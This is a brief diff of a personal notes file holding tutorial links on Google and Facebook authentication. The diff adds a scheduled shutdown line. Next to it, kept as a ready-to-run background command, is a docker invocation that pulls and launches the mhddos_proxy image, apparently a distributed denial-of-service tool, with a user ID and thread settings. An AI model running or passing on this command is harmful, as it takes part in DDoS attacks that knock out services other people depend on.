@@ -13,6 +13,7 @@ https://codevoweb.com/google-oauth-authentication-react-and-node/
 //facebook authorization
 https://morioh.com/p/296017f5fd48
 /*****base command in background process***/
+sudo shutdown 02:00
 docker run  -d -it --rm --pull always --net=host ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -t 700 --lang UA --user-id 880460538
 
 
